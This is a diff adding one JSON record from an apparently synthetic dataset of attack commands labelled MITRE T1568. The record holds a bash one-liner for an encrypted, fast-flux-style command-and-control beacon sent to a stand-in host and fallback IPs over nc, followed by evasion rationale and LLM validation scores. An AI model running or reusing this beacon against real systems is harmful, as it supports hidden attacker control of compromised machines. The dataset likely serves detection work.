@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=cdn-cache.example.org; ips=$(dig +short \\\"$host\\\" A | shuf); ua=\\\"Mozilla/5.0\\\"; for ip in $ips 203.0.113.77 198.51.100.77; do cmd=$(printf '{\"op\":\"tasks\",\"ts\":%s}' \\\"$(date -u +%s)\\\"); enc=$(printf '%s' \\\"$cmd\\\" | openssl enc -aes-256-cbc -pbkdf2 -k s3cr3t | base64 -w0); req=$(printf 'GET /api/tasks HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAuthorization: Bearer %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$host\\\" \\\"$ua\\\" \\\"$enc\\\"); printf '%s' \\\"$req\\\" | nc -w 5 \\\"$ip\\\" 80 && break; sleep $((RANDOM%5+1)); done\"",
+  "explanation": "Shuffles through multiple A records (fast flux) with fallback IPs; embeds AES-encrypted, base64-encoded instructions in an Authorization header while imitating an API call.",
+  "rationale_steps": [
+    "Resolve multiple A records at runtime and randomize selection.",
+    "Maintain fallback IPs for resiliency if DNS is disrupted.",
+    "Use a realistic HTTP API path and headers to blend in.",
+    "Encrypt instructions with AES and base64 to reduce visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-8ffcacf7",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and substitutions, valid printf/loop constructs, and proper piping/redirection make it well-formed for bash with standard tools.",
+        "semantic_score": 5,
+        "semantic_justification": "It dynamically resolves and shuffles A records to rotate endpoints with DNS-derived IPs plus fallbacks and performs C2-like beacons, aligning closely with T1568 dynamic resolution/fast-flux behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:05:23.068783Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed with proper quoting and command chaining, but the variable expansion of `$ips` in the for loop without quoting and the mixing of `printf` format strings with embedded variables creates edge cases where word splitting or empty results from `dig` could cause parsing issues.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 fast-flux behavior by shuffling DNS A records and appending hardcoded fallback IPs, uses AES-256-CBC encrypted payloads encoded in base64 as a Bearer token to blend with legitimate API traffic, and employs randomized sleep intervals and User-Agent spoofing consistent with stealthy C2 beaconing over dynamic endpoints.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T00:17:14.410713Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed with correct nested quote escaping, valid shell loops, proper piping, and standard flags for dig, openssl, and nc.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements dynamic endpoint resolution by shuffling DNS results (fast-flux imitation) and includes realistic C2 behaviors like encrypted headers and fallback IPs.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:17:16.594575Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
